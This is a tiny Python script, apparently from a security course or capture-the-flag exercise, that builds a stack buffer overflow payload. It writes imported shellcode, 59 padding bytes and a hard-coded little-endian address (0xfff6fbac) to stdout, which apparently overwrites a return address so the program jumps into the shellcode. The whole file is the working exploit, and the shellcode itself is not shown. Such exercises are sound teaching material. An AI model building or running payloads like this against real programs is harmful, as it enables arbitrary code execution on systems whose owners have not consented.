from shellcode import shellcode
import sys

b = b"\x32" * 59

sys.stdout.buffer.write(shellcode +b + b"\xac\xfb\xf6\xff")